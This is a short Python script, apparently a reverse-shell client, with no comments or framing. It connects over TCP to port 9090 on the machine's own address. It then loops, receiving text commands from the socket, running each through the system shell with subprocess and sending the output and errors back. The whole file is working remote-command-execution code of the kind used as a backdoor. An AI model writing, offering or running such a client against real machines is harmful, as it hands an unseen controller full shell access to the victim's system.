import socket
import subprocess


host = socket.gethostbyname(socket.gethostname())
port = 9090

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((host, port))
print("Connected to Server!")

while True:
    command = client.recv(1024).decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)